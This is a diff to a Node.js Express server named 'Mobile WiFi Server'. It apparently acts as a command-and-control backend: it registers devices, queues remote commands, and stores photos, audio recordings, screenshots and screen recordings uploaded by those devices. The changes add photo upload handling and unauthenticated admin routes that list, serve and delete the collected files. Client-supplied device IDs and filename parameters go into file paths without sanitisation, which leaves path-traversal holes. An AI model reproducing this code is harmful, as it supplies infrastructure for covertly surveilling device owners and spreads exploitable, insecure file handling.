@@ -34,12 +34,17 @@ const storage = multer.diskStorage({
       cb(null, RECORDINGS_DIR);
     } else if (file.fieldname === 'file') {
       cb(null, SCREEN_RECORDINGS_DIR);
+    } else if (file.fieldname === 'photo') {
+      cb(null, PHOTOS_DIR);
     } else {
       cb(null, UPLOAD_DIR);
     }
   },
   filename: function (req, file, cb) {
-    const uniqueName = `${Date.now()}-${Math.round(Math.random() * 1E9)}${path.extname(file.originalname)}`;
+    const device_id = req.body.device_id || req.headers['x-device-id'] || 'unknown';
+    const timestamp = Date.now();
+    const ext = path.extname(file.originalname);
+    const uniqueName = `${device_id}_${timestamp}${ext}`;
     cb(null, uniqueName);
   }
 });
@@ -63,7 +68,7 @@ app.get('/', (req, res) => {
   res.json({
     status: 'online',
     message: 'Mobile WiFi Server - Node.js',
-    server_ip: req.headers.host,
+    server_url: `${req.protocol}://${req.get('host')}`,
     endpoints: {
       register_device: '/register_device [POST]',
       update_status: '/update_status [POST]',
@@ -73,6 +78,8 @@ app.get('/', (req, res) => {
       screenshot_upload: '/screenshot/upload [POST]',
       upload_data: '/data [POST]',
       admin_devices: '/admin/devices [GET]',
+      admin_photos: '/admin/photos [GET]',
+      delete_photo: '/admin/photos/:filename [DELETE]',
       send_command: '/admin/send_command [POST]'
     }
   });
@@ -187,57 +194,58 @@ app.get('/get_commands/:device_id', (req, res) => {
 });
 
 // Upload photo
-app.post('/upload_photo', upload.none(), (req, res) => {
+app.post('/upload_photo', upload.single('photo'), (req, res) => {
   try {
-    const device_id = req.headers['x-device-id'] || req.body.device_id || 'unknown';
-    const filename = req.headers['x-file-name'] || `photo_${Date.now()}.jpg`;
-    
-    // Check if photo data is in request body
-    if (req.body && req.body.data) {
-      // Handle base64 encoded photo
-      const base64Data = req.body.data.replace(/^data:image\/\w+;base64,/, '');
-      const buffer = Buffer.from(base64Data, 'base64');
+    if (!req.file) {
+      // Try base64 data
+      if (req.body && req.body.data) {
+        const device_id = req.headers['x-device-id'] || req.body.device_id || 'unknown';
+        const filename = req.headers['x-file-name'] || `photo_${Date.now()}.jpg`;
+        
+        // Handle base64 encoded photo
+        const base64Data = req.body.data.replace(/^data:image\/\w+;base64,/, '');
+        const buffer = Buffer.from(base64Data, 'base64');
+        
+        const uniqueFilename = `${device_id}_${Date.now()}_${filename}`;
+        const filepath = path.join(PHOTOS_DIR, uniqueFilename);
+        
+        fs.writeFileSync(filepath, buffer);
+        
+        const sizeKB = (buffer.length / 1024).toFixed(2);
+        
+        console.log(`📸 Photo uploaded (base64) - Device: ${device_id}, Size: ${sizeKB} KB, File: ${uniqueFilename}`);
+        
+        return res.json({
+          status: 'success',
+          message: 'Photo uploaded successfully',
+          filename: uniqueFilename,
+          size_kb: sizeKB,
+          device_id: device_id,
+          url: `/uploads/photos/${uniqueFilename}`
+        });
+      }
       
-      const uniqueFilename = `${device_id}_${Date.now()}_${filename}`;
-      const filepath = path.join(PHOTOS_DIR, uniqueFilename);
-      
-      fs.writeFileSync(filepath, buffer);
-      
-      const sizeKB = (buffer.length / 1024).toFixed(2);
-      
-      console.log(`Photo uploaded - Device: ${device_id}, Size: ${sizeKB} KB`);
-      
-      return res.json({
-        status: 'success',
-        message: 'Photo uploaded successfully',
-        filename: uniqueFilename,
-        size_kb: sizeKB,
-        device_id: device_id
-      });
+      return res.status(400).json({ error: 'No photo data received' });
     }
     
-    // Handle multipart photo upload
-    if (req.files && req.files.photo) {
-      const file = req.files.photo;
-      const uniqueFilename = `${device_id}_${Date.now()}_${file.name}`;
-      const filepath = path.join(PHOTOS_DIR, uniqueFilename);
-      
-      fs.moveSync(file.path, filepath);
-      
-      const stats = fs.statSync(filepath);
-      const sizeKB = (stats.size / 1024).toFixed(2);
-      
-      console.log(`Photo uploaded (file) - Device: ${device_id}, Size: ${sizeKB} KB`);
-      
-      return res.json({
-        status: 'success',
-        message: 'Photo uploaded successfully',
-        filename: uniqueFilename,
-        size_kb: sizeKB
-      });
-    }
+    // File upload
+    const device_id = req.body.device_id || req.headers['x-device-id'] || 'unknown';
+    const filename = req.file.filename;
+    const filepath = req.file.path;
     
-    res.status(400).json({ error: 'No photo data received' });
+    const stats = fs.statSync(filepath);
+    const sizeKB = (stats.size / 1024).toFixed(2);
+    
+    console.log(`📸 Photo uploaded (file) - Device: ${device_id}, Size: ${sizeKB} KB, File: ${filename}`);
+    
+    res.json({
+      status: 'success',
+      message: 'Photo uploaded successfully',
+      filename: filename,
+      size_kb: sizeKB,
+      device_id: device_id,
+      url: `/uploads/photos/${filename}`
+    });
     
   } catch (error) {
     console.error('Photo upload error:', error);
@@ -253,14 +261,9 @@ app.post('/upload_screen_recording', upload.single('file'), (req, res) => {
     }
     
     const device_id = req.body.device_id || req.headers['x-device-id'] || 'unknown';
-    const filename = req.file.originalname;
+    const filename = req.file.filename;
     
-    const uniqueFilename = `screen_${device_id}_${Date.now()}_${filename}`;
-    const newPath = path.join(SCREEN_RECORDINGS_DIR, uniqueFilename);
-    
-    fs.moveSync(req.file.path, newPath);
-    
-    const stats = fs.statSync(newPath);
+    const stats = fs.statSync(req.file.path);
     const sizeMB = (stats.size / (1024 * 1024)).toFixed(2);
     
     console.log(`Screen recording uploaded - Device: ${device_id}, Size: ${sizeMB} MB`);
@@ -268,7 +271,7 @@ app.post('/upload_screen_recording', upload.single('file'), (req, res) => {
     res.json({
       status: 'success',
       message: 'Screen recording uploaded',
-      filename: uniqueFilename,
+      filename: filename,
       size_mb: sizeMB,
       device_id: device_id
     });
@@ -288,13 +291,9 @@ app.post('/screenshot/upload', upload.single('screenshot'), (req, res) => {
     
     const device_id = req.body.device_id || 'unknown';
     const command_id = req.body.command_id || 'unknown';
+    const filename = req.file.filename;
     
-    const uniqueFilename = `screenshot_${device_id}_${command_id}_${Date.now()}.png`;
-    const newPath = path.join(SCREENSHOTS_DIR, uniqueFilename);
-    
-    fs.moveSync(req.file.path, newPath);
-    
-    const stats = fs.statSync(newPath);
+    const stats = fs.statSync(req.file.path);
     const sizeKB = (stats.size / 1024).toFixed(2);
     
     console.log(`Screenshot uploaded - Device: ${device_id}, Size: ${sizeKB} KB`);
@@ -302,7 +301,7 @@ app.post('/screenshot/upload', upload.single('screenshot'), (req, res) => {
     res.json({
       status: 'success',
       message: 'Screenshot uploaded',
-      filename: uniqueFilename,
+      filename: filename,
       size_kb: sizeKB,
       device_id: device_id,
       command_id: command_id
@@ -322,13 +321,9 @@ app.post('/data', upload.single('audio_file'), (req, res) => {
     }
     
     const device_id = req.body.device_id || 'unknown';
+    const filename = req.file.filename;
     
-    const uniqueFilename = `audio_${device_id}_${Date.now()}.3gp`;
-    const newPath = path.join(RECORDINGS_DIR, uniqueFilename);
-    
-    fs.moveSync(req.file.path, newPath);
-    
-    const stats = fs.statSync(newPath);
+    const stats = fs.statSync(req.file.path);
     const sizeMB = (stats.size / (1024 * 1024)).toFixed(2);
     
     console.log(`Audio uploaded - Device: ${device_id}, Size: ${sizeMB} MB`);
@@ -336,7 +331,7 @@ app.post('/data', upload.single('audio_file'), (req, res) => {
     res.json({
       status: 'success',
       message: 'Audio uploaded',
-      filename: uniqueFilename,
+      filename: filename,
       size_mb: sizeMB,
       device_id: device_id
     });
@@ -346,6 +341,8 @@ app.post('/data', upload.single('audio_file'), (req, res) => {
     res.status(500).json({ error: error.message });
   }
 });
+
+// ==================== ADMIN ROUTES ====================
 
 // Admin: Get all devices
 app.get('/admin/devices', (req, res) => {
@@ -375,6 +372,123 @@ app.get('/admin/devices', (req, res) => {
     
   } catch (error) {
     console.error('Get devices error:', error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// Admin: Get all photos
+app.get('/admin/photos', (req, res) => {
+  try {
+    console.log('📸 Request for photos list');
+    
+    // Check if photos directory exists
+    if (!fs.existsSync(PHOTOS_DIR)) {
+      return res.json({
+        success: true,
+        photos: [],
+        count: 0,
+        message: 'No photos directory found'
+      });
+    }
+    
+    // Read all files from photos directory
+    const files = fs.readdirSync(PHOTOS_DIR)
+      .filter(file => {
+        // Filter only image files
+        const ext = path.extname(file).toLowerCase();
+        return ['.jpg', '.jpeg', '.png', '.gif', '.bmp'].includes(ext);
+      })
+      .map(file => {
+        const filePath = path.join(PHOTOS_DIR, file);
+        const stats = fs.statSync(filePath);
+        
+        // Extract device ID from filename
+        let deviceId = 'unknown';
+        if (file.includes('_')) {
+          const parts = file.split('_');
+          deviceId = parts[0];
+        }
+        
+        return {
+          filename: file,
+          device_id: deviceId,
+          url: `${req.protocol}://${req.get('host')}/uploads/photos/${file}`,
+          download_url: `${req.protocol}://${req.get('host')}/download/photo/${file}`,
+          size: stats.size,
+          size_formatted: formatFileSize(stats.size),
+          created: stats.birthtime,
+          created_formatted: new Date(stats.birthtime).toLocaleString(),
+          modified: stats.mtime
+        };
+      })
+      .sort((a, b) => new Date(b.created) - new Date(a.created)); // Newest first
+    
+    console.log(`Found ${files.length} photos`);
+    
+    res.json({
+      success: true,
+      photos: files,
+      count: files.length,
+      server_url: `${req.protocol}://${req.get('host')}`,
+      timestamp: new Date().toISOString()
+    });
+    
+  } catch (error) {
+    console.error('Get photos error:', error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// Helper function to format file size
+function formatFileSize(bytes) {
+  if (bytes < 1024) return bytes + ' bytes';
+  else if (bytes < 1048576) return (bytes / 1024).toFixed(2) + ' KB';
+  else return (bytes / 1048576).toFixed(2) + ' MB';
+}
+
+// Admin: Delete a photo
+app.delete('/admin/photos/:filename', (req, res) => {
+  try {
+    const { filename } = req.params;
+    const filePath = path.join(PHOTOS_DIR, filename);
+    
+    if (!fs.existsSync(filePath)) {
+      return res.status(404).json({ error: 'Photo not found' });
+    }
+    
+    fs.unlinkSync(filePath);
+    console.log(`🗑️ Photo deleted: ${filename}`);
+    
+    res.json({
+      success: true,
+      message: `Photo ${filename} deleted successfully`
+    });
+    
+  } catch (error) {
+    console.error('Delete photo error:', error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// Admin: Clear all photos
+app.delete('/admin/photos', (req, res) => {
+  try {
+    if (fs.existsSync(PHOTOS_DIR)) {
+      const files = fs.readdirSync(PHOTOS_DIR);
+      files.forEach(file => {
+        const filePath = path.join(PHOTOS_DIR, file);
+        fs.unlinkSync(filePath);
+      });
+      console.log(`🗑️ Cleared all photos (${files.length} files)`);
+    }
+    
+    res.json({
+      success: true,
+      message: 'All photos cleared successfully'
+    });
+    
+  } catch (error) {
+    console.error('Clear photos error:', error);
     res.status(500).json({ error: error.message });
   }
 });
@@ -464,8 +578,38 @@ app.get('/download/:type/:filename', (req, res) => {
   }
 });
 
-// Static files (for web interface)
-app.use('/uploads', express.static('uploads'));
+// Get single photo info
+app.get('/photo/:filename', (req, res) => {
+  try {
+    const { filename } = req.params;
+    const filepath = path.join(PHOTOS_DIR, filename);
+    
+    if (!fs.existsSync(filepath)) {
+      return res.status(404).json({ error: 'Photo not found' });
+    }
+    
+    const stats = fs.statSync(filepath);
+    
+    res.json({
+      success: true,
+      filename: filename,
+      url: `${req.protocol}://${req.get('host')}/uploads/photos/${filename}`,
+      size: stats.size,
+      created: stats.birthtime,
+      modified: stats.mtime
+    });
+    
+  } catch (error) {
+    console.error('Get photo error:', error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// Serve static files
+app.use('/uploads/photos', express.static(PHOTOS_DIR));
+app.use('/uploads/recordings', express.static(RECORDINGS_DIR));
+app.use('/uploads/screenshots', express.static(SCREENSHOTS_DIR));
+app.use('/uploads/screen_recordings', express.static(SCREEN_RECORDINGS_DIR));
 
 // Error handling middleware
 app.use((err, req, res, next) => {
@@ -483,10 +627,10 @@ app.listen(PORT, () => {
   📁 Uploads: ${UPLOAD_DIR}/
   🌐 URL: http://localhost:${PORT}
   ==============================================
-  📸 Photos: ${PHOTOS_DIR}/
-  🎤 Recordings: ${RECORDINGS_DIR}/
-  📱 Screenshots: ${SCREENSHOTS_DIR}/
-  🎥 Screen Recordings: ${SCREEN_RECORDINGS_DIR}/
+  📸 Photos: /admin/photos [GET]
+  📱 Devices: /admin/devices [GET]
+  🎯 Commands: /admin/send_command [POST]
+  📤 Upload: /upload_photo [POST]
   ==============================================
   ✅ Server is running...
   ==============================================
